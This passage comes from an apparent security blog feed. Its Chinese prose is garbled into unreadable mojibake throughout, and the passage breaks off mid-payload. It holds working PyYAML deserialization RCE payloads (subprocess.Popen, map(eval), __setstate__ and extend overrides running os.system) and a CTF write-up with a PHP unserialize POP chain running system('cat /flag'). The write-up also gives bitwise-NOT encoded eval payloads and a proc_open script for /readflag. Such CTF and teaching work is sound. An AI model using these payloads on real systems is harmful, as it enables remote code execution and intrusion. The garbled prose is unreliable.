class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> module_name <span class="hljs-keyword">in</span> sys.modules:<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python object&quot;</span>, mark,<br>                <span class="hljs-string">&quot;module %r is not imported&quot;</span> % module_name, mark)<br>    module = sys.modules[module_name]<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(module, object_name):<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python object&quot;</span>, mark,<br>                <span class="hljs-string">&quot;cannot find %r in the module %r&quot;</span><br>                % (object_name, module.__name__), mark)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, object_name)<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å¼•å…¥äº† unsafe ï¼Œå¹¶ä¸”æœ‰å¦‚ä¸‹çš„è§„åˆ™</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (unsafe <span class="hljs-keyword">or</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>))<br><span class="hljs-comment">#  module.name å¿…é¡»æ˜¯ä¸€ä¸ªç±»</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> module_name <span class="hljs-keyword">in</span> sys.modules<br><span class="hljs-comment"># é™åˆ¶äº†å¯¼å…¥çš„moduleå¿…é¡»åœ¨ sys.modules ä¸­</span><br></code></pre></td></tr></table></figure>

<p><strong>æ–¹æ³•ä¸€ï¼š</strong></p>
<p>æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯éå† sys.modules å­—å…¸ï¼Œæ‰¾ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„æ¨¡å—ä¸­èƒ½æ‰§è¡Œå‘½ä»¤çš„ç±»</p>
<p>æ¯”å¦‚ subprocess.Popen</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">yaml.load(<span class="hljs-string">&quot;!!python/object/apply:subprocess.Popen [whoami]&quot;</span>)<br></code></pre></td></tr></table></figure>



<p><strong>æ–¹æ³•äºŒï¼š</strong></p>
<p>å€ŸåŠ© map æ¥è§¦å‘å‡½æ•°æ‰§è¡Œ</p>
<p>ä¾‹å¦‚<code>map(eval, [&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;])</code></p>
<blockquote>
<p>éœ€è¦æ³¨æ„åœ¨python2ä¸­ä¼šç›´æ¥è¿”å›ç»“æœï¼Œä½†æ˜¯åœ¨python3ä¸­è¿”å›çš„å°±æ˜¯ä¸€ä¸ªmapå¯¹è±¡ï¼Œéœ€è¦ç”¨ä¸€äº›å‡½æ•°æ¥éå†</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python3</span><br><span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>]))<br><span class="hljs-built_in">set</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>]))<br><span class="hljs-built_in">tuple</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>]))<br><span class="hljs-built_in">frozenset</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>]))<br><span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>]))<br></code></pre></td></tr></table></figure>

<p>è½¬æ¢æˆyamlæ ¼å¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> yaml<br><br><span class="hljs-comment"># python2</span><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:map</span><br><span class="hljs-string">  - !!python/name:eval</span><br><span class="hljs-string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br><br><span class="hljs-comment"># python3</span><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:tuple</span><br><span class="hljs-string">- !!python/object/new:map</span><br><span class="hljs-string">  - !!python/name:eval</span><br><span class="hljs-string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:frozenset</span><br><span class="hljs-string">- !!python/object/new:map</span><br><span class="hljs-string">  - !!python/name:eval</span><br><span class="hljs-string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:bytes</span><br><span class="hljs-string">- !!python/object/new:map</span><br><span class="hljs-string">  - !!python/name:eval</span><br><span class="hljs-string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨ä½¿ç”¨<code>!!python/object/new</code>çš„æƒ…å†µä¸‹åªèƒ½ä½¿ç”¨ tupleï¼Œbytes ç­‰å‡½æ•°æ¥éå†mapå¯¹è±¡ï¼Œç”¨ list æˆ–è€… set éƒ½ä¸è¡Œï¼ˆå½“ç„¶åœ¨ !!python&#x2F;object&#x2F;apply ä¸‹æ²¡æœ‰é—®é¢˜ï¼‰</p>
<p>è¿™æ˜¯å› ä¸ºä¸Šæ–‡æåˆ°çš„ python&#x2F;object&#x2F;new ä¸ python&#x2F;object&#x2F;apply çš„ä¸åŒä¹‹å¤„å¯¼è‡´çš„</p>
<p>å½“è°ƒç”¨ construct_python_object_apply æ—¶ä¼šä½¿ newobj ä¸º trueï¼Œé‚£ä¹ˆæ¡ä»¶å°±æˆç«‹äº†ï¼Œå°±ä¼šè°ƒç”¨ cls.__new__(cls, *args, **kwds)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> newobj <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>):<br>    <span class="hljs-keyword">return</span> cls.__new__(cls, *args, **kwds)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> cls(*args, **kwds)<br></code></pre></td></tr></table></figure>

<p>å› ä¸ºè¿™å‡ ä¸ªå‡½æ•°çš„åº•å±‚å®ç°å¹¶ä¸ç›¸åŒï¼Œæ‰€ä»¥éƒ¨åˆ†å‡½æ•°ä¸èƒ½ä½¿ç”¨ __new__ æ¥ä¼ å€¼</p>
<p><img src="/img/summary/python_unserialize-13.png"></p>
<p><strong>å…¶ä»–æ–¹æ³•ï¼š</strong></p>
<p>ç»§ç»­çœ‹ !!python&#x2F;object&#x2F;new çš„ä»£ç ï¼Œå¯ä»¥å‘ç°é™¤äº†è°ƒç”¨ make_python_instance å¤–è¿˜æœ‰ä¸‰ä¸ªåˆ¤æ–­ï¼Œè¿™ä¸‰ä¸ªåˆ¤æ–­åœ¨ä¹‹å‰çš„payloadä¸­å¹¶æ²¡æœ‰ä½¿ç”¨ï¼Œå› ä¸ºå¹¶æ²¡æœ‰ä¼ å¯¹åº”çš„å€¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> state:<br>    self.set_python_instance_state(instance, state)<br><span class="hljs-keyword">if</span> listitems:<br>    instance.extend(listitems)<br><span class="hljs-keyword">if</span> dictitems:<br>    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dictitems:<br>        instance[key] = dictitems[key]<br></code></pre></td></tr></table></figure>


<p>é¦–å…ˆæ˜¯å½“ listitems å­˜åœ¨ï¼Œå°±ä¼šè§¦å‘ instance ä¸‹çš„ extend æ–¹æ³•ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªç±»ï¼Œåœ¨ç±»ä¸­æ·»åŠ ä¸€ä¸ªåä¸º extend çš„æ–¹æ³•ï¼Œç„¶åé‡å†™æˆ evalï¼Œå°±ç›¸å½“äº instance.eval(listitems)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># åˆ©ç”¨ type åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»</span><br>a = <span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;rce&quot;</span>, (), &#123;<span class="hljs-string">&quot;extend&quot;</span>: <span class="hljs-built_in">eval</span>&#125;)<br>a.extend(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>è½¬æˆYAML</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:type</span><br><span class="hljs-string">args:</span><br><span class="hljs-string">  - rce</span><br><span class="hljs-string">  - !!python/tuple []</span><br><span class="hljs-string">  - &#123;&quot;extend&quot;: !!python/name:eval &#125;</span><br><span class="hljs-string">listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/img/summary/python_unserialize-14.png"></p>
<p>state çš„åˆ©ç”¨æ–¹å¼ä¹Ÿæ˜¯åŒæ ·çš„ï¼Œé€šè¿‡ä¿®æ”¹ <code>__setstate__</code> è¾¾åˆ°æ‰§è¡Œå‡½æ•°çš„ç›®çš„ï¼ˆä¸pickleä¸­çš„åˆ©ç”¨__setstate__æ‰§è¡Œå‘½ä»¤ç±»ä¼¼ï¼‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_python_instance_state</span>(<span class="hljs-params">self, instance, state</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(instance, <span class="hljs-string">&#x27;__setstate__&#x27;</span>):<br>        instance.__setstate__(state)<br>    <span class="hljs-keyword">else</span>:<br>        slotstate = &#123;&#125;<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(state, <span class="hljs-built_in">tuple</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(state) == <span class="hljs-number">2</span>:<br>            state, slotstate = state<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(instance, <span class="hljs-string">&#x27;__dict__&#x27;</span>):<br>            instance.__dict__.update(state)<br>        <span class="hljs-keyword">elif</span> state:<br>            slotstate.update(state)<br>        <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> slotstate.items():<br>            <span class="hljs-built_in">setattr</span>(<span class="hljs-built_in">object</span>, key, value)<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a = <span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;rce&quot;</span>, (), &#123;<span class="hljs-string">&quot;__setstate__&quot;</span>: <span class="hljs-built_in">eval</span>&#125;)<br>a.__setstate__(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>è½¬ä¸ºYAML</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:type</span><br><span class="hljs-string">args:</span><br><span class="hljs-string">  - rce</span><br><span class="hljs-string">  - !!python/tuple []</span><br><span class="hljs-string">  - &#123;&quot;__setstate__&quot;: !!python/name:eval &#125;</span><br><span class="hljs-string">state: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/img/summary/python_unserialize-15.png"></p>
<p><strong>æ€»ç»“ï¼šæœ‰èƒ½è°ƒç”¨å®ä¾‹æ–¹æ³•çš„åœ°æ–¹ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ„é€ ä¸€ä¸ªå®ä¾‹ï¼Œç”¨æ¶æ„å‡½æ•°å»æ›¿æ¢ï¼Œæ¥æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç </strong></p>
<p>æ¯”å¦‚ set_python_instance_state ä¸‹çš„ slotstate.update(state) ä¹Ÿå¯ä»¥rce</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:type</span><br><span class="hljs-string">  args: []</span><br><span class="hljs-string">  state: !!python/tuple</span><br><span class="hljs-string">    - &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">    - !!python/object/new:type</span><br><span class="hljs-string">      args:</span><br><span class="hljs-string">        - exp</span><br><span class="hljs-string">        - !!python/tuple []</span><br><span class="hljs-string">        - &#123;&quot;update&quot;: !!python/name:exec , &quot;items&quot;: !!python/name:list &#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br><span class="hljs-comment"># å¦ä¸€ç§å†™æ³•ï¼Œç”¨ staticmethod ä»£æ›¿ type</span><br>yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:str</span><br><span class="hljs-string">    args: []</span><br><span class="hljs-string">    state: !!python/tuple</span><br><span class="hljs-string">      - &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">      - !!python/object/new:staticmethod</span><br><span class="hljs-string">        args: []</span><br><span class="hljs-string">        state:</span><br><span class="hljs-string">          update: !!python/name:eval</span><br><span class="hljs-string">          items: !!python/name:list</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>



<p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/">SecMap - ååºåˆ—åŒ–ï¼ˆPythonï¼‰</a><br><a href="https://tttang.com/archive/1885/">pythonååºåˆ—åŒ–è¯¦è§£</a><br><a href="https://tttang.com/archive/1782/">Python pickleååºåˆ—åŒ–æµ…æ</a><br><a href="https://goodapple.top/archives/1069">Pickleååºåˆ—åŒ–</a><br><a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml">SecMap - ååºåˆ—åŒ–ï¼ˆPyYAMLï¼‰</a></p>
]]></content>
      <categories>
        <category>æ€»ç»“</category>
      </categories>
      <tags>
        <tag>æ€»ç»“</tag>
        <tag>python</tag>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬å…­å±Šæµ™æ±Ÿçœå¤§å­¦ç”Ÿç½‘ç»œä¸ä¿¡æ¯å®‰å…¨ç«èµ›-WP</title>
    <url>/posts/13f4d784/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="åˆèµ›-easy-php"><a href="#åˆèµ›-easy-php" class="headerlink" title="åˆèµ›[easy php]"></a>åˆèµ›[easy php]</h2><p>ç­¾åˆ°é¢˜</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;done&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$param1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__debuginfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> [<br>            <span class="hljs-string">&#x27;debugInfo&#x27;</span> =&gt; <span class="hljs-string">&#x27;param1&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;param1<br>        ];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;func-&gt;<span class="hljs-title function_ invoke__">aaa</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">BBB</span>();<br><span class="hljs-variable">$a</span>-&gt;param1 = <span class="hljs-keyword">new</span> CCC;<br><span class="hljs-variable">$a</span>-&gt;param1-&gt;func = <span class="hljs-keyword">new</span> AAA;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>



<h2 id="åˆèµ›-can-you-read-flag"><a href="#åˆèµ›-can-you-read-flag" class="headerlink" title="åˆèµ›[can you read flag]"></a>åˆèµ›[can you read flag]</h2><blockquote>
<p>å¥½åƒåšå¤æ‚äº†</p>
</blockquote>
<p>è®¿é—®é¡µé¢è¿”å›<code>//eval($_GET[a]);</code></p>
<p>çˆ†ç ´ä¸€ä¸‹çœ‹å“ªäº›ç¬¦å·èƒ½ç”¨</p>
<p>å¯ä»¥ç”¨å–åï¼Œä¾‹å¦‚<code>(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code></p>
<p>å‘ç°æ ¹ç›®å½•æœ‰<code>flag</code>å’Œ<code>readflag</code>ï¼Œflagæ²¡æœ‰æƒé™è¯»å–</p>
<p><img src="/img/wp/2023/2023zhejiang-1.png"></p>
<p>base64è½¬ä¸€ä¸‹è¯»å–readflag</p>
<p><code>(~%8C%86%8C%8B%9A%92)(~%9D%9E%8C%9A%C9%CB%DF%D0%8D%9A%9E%9B%99%93%9E%98);</code></p>
<p><img src="/img/wp/2023/2023zhejiang-2.png"></p>
<p>æ‰§è¡Œreadflagåè¦å…ˆè¾“å…¥ä¸€ä¸ª<code>y</code>ï¼Œç„¶åè¿›å…¥å¾ªç¯å¼€å§‹è®¡ç®—å¼å­ï¼Œå¤§æ¦‚æˆåŠŸè®¡ç®—100å¤šè½®åè¯»å–flagå¹¶è¾“å‡º</p>
<p><img src="/img/wp/2023/2023zhejiang-3.png"></p>
<p>é¶æœºçš„webç›®å½•ä¸èƒ½è¯»å†™ï¼Œåœ¨&#x2F;tmpç›®å½•ä¸‹å†™ä¸€ä¸ªphpè„šæœ¬ç”¨æ¥è®¡ç®—</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$desc</span>=<span class="hljs-keyword">array</span>(<br>        <span class="hljs-number">0</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>),<br>        <span class="hljs-number">1</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<br>        <span class="hljs-number">2</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;file&quot;</span>,<span class="hljs-string">&quot;/tmp/error-output.txt&quot;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>);<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-string">&quot;/readflag&quot;</span>,<span class="hljs-variable">$desc</span>,<span class="hljs-variable">$handle</span>);<br><span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$wh</span>=<span class="hljs-variable">$handle</span>[<span class="hljs-number">0</span>];<br><span class="hljs-variable">$rh</span>=<span class="hljs-variable">$handle</span>[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$rh</span> <span class="hljs-subst">$wh</span> open\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$handle</span>);<br><span class="hljs-variable">$read</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$rh</span>,<span class="hljs-number">2096</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$read</span>\n&quot;</span>;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$wh</span>,<span class="hljs-string">&#x27;y&#x27;</span>);<br><br><span class="hljs-variable">$read</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$rh</span>,<span class="hljs-number">2048</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;read: &quot;</span>.<span class="hljs-variable">$read</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$read</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$rh</span>,<span class="hljs-number">2048</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$i</span>:<span class="hljs-subst">$read</span>\n&quot;</span>;<br><span class="hljs-variable">$op</span>=<span class="hljs-string">&quot;\$value=&quot;</span>.<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">strtok</span>(<span class="hljs-variable">$read</span>,<span class="hljs-string">&quot; =&quot;</span>)).<span class="hljs-string">&#x27;;&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$op</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$op</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>.<span class="hljs-string">&quot;\n&quot;</span>.<span class="hljs-variable">$op</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$wh</span>,<span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$value</span>).PHP_EOL);<br><span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">200</span>)&#123;<br>    <span class="hljs-variable">$read</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$rh</span>,<span class="hljs-number">2048</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$i</span>:<span class="hljs-subst">$read</span>\n&quot;</span>;<br>    <span class="hljs-variable">$op</span>=<span class="hljs-string">&quot;\$value=&quot;</span>.<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">strtok</span>(<span class="hljs-variable">$read</span>,<span class="hljs-string">&quot; =&quot;</span>)).<span class="hljs-string">&#x27;;&#x27;</span>;<br><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$op</span>);<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$wh</span>,<span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$value</span>).PHP_EOL);<br>        <span class="hljs-variable">$i</span>++;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">(~%<span class="hljs-number">8</span>C%<span class="hljs-number">86</span>%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">92</span>)(~%D7%<span class="hljs-number">9</span>A%<span class="hljs-number">9</span>C%<span class="hljs-number">97</span>%<span class="hljs-number">90</span>%DF%DD%AF%BB%C6%<span class="hljs-number">88</span>%<span class="hljs-number">9</span>E%B7%BE%B1%BC%<span class="hljs-number">98</span>%CF%B4%B5%B8%AD%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>C%CD%B2%C6%A6%A7%B5%<span class="hljs-number">86</span>%A6%A7%<span class="hljs-number">94</span>%<span class="hljs-number">90</span>%BB%AE%<span class="hljs-number">90</span>%B5%B2%BB%CF%D4%A6%A7%B5%<span class="hljs-number">86</span>%A6%A7%<span class="hljs-number">94</span>%<span class="hljs-number">90</span>%B6%<span class="hljs-number">91</span>%BD%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>C%B8%AA%<span class="hljs-number">96</span>%B3%BC%<span class="hljs-number">9</span>B%<span class="hljs-number">86</span>%B5%<span class="hljs-number">86</span>%<span class="hljs-number">94</span>%<span class="hljs-number">8</span>C%BB%AE%<span class="hljs-number">90</span>%B5%B2%AB%CF%D4%A6%A7%B5%<span class="hljs-number">86</span>%A6%A7%<span class="hljs-number">94</span>%<span class="hljs-number">90</span>%B6%<span class="hljs-number">91</span>%BD%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>C%B8%AA%<span class="hljs-number">96</span>%B3%BC%<span class="hljs-number">9</span>B%CC%B5%<span class="hljs-number">86</span>%<span class="hljs-number">94</span>%<span class="hljs-number">8</span>C%BB%AE%<span class="hljs-number">90</span>%B5%B2%<span class="hljs-number">95</span>%CF%D4%A6%A7%B5%<span class="hljs-number">86</span>%A6%A7%<span class="hljs-number">94</span>%<span class="hljs-number">90</span>%B6%<span class="hljs-number">92</span>%A5%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>D%B8%AA%<span class="hljs-number">96</span>%B3%BC%B6%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>B%B8%CE%<span class="hljs-number">88</span>%B3%CD%A9%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%C6%<span class="hljs-number">86</span>%B3%A8%C6%CE%<span class="hljs-number">9</span>B%B7%BD%CE%<span class="hljs-number">9</span>B%BC%CA%CF%<span class="hljs-number">9</span>A%B7%AE%<span class="hljs-number">96</span>%B3%BC%<span class="hljs-number">9</span>B%<span class="hljs-number">97</span>%B5%<span class="hljs-number">86</span>%<span class="hljs-number">94</span>%B1%BC%<span class="hljs-number">96</span>%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%A6%AB%CE%<span class="hljs-number">88</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%C6%<span class="hljs-number">95</span>%A7%CD%C6%<span class="hljs-number">88</span>%A5%A8%CB%<span class="hljs-number">90</span>%B6%<span class="hljs-number">96</span>%C6%<span class="hljs-number">86</span>%A5%A8%B9%<span class="hljs-number">94</span>%A5%<span class="hljs-number">92</span>%<span class="hljs-number">87</span>%<span class="hljs-number">97</span>%A5%<span class="hljs-number">86</span>%B6%<span class="hljs-number">8</span>C%B5%B8%AD%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>C%CD%B2%<span class="hljs-number">8</span>C%B5%B8%<span class="hljs-number">97</span>%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">92</span>%AD%<span class="hljs-number">8</span>C%A5%AC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>C%CE%C6%<span class="hljs-number">86</span>%A5%A7%B1%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>B%A7%B5%<span class="hljs-number">95</span>%A5%AC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%A6%AC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>B%CD%<span class="hljs-number">98</span>%C6%B5%B8%<span class="hljs-number">97</span>%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">92</span>%AD%<span class="hljs-number">8</span>C%A5%A9%<span class="hljs-number">8</span>C%<span class="hljs-number">88</span>%A7%AB%<span class="hljs-number">8</span>C%B1%BC%<span 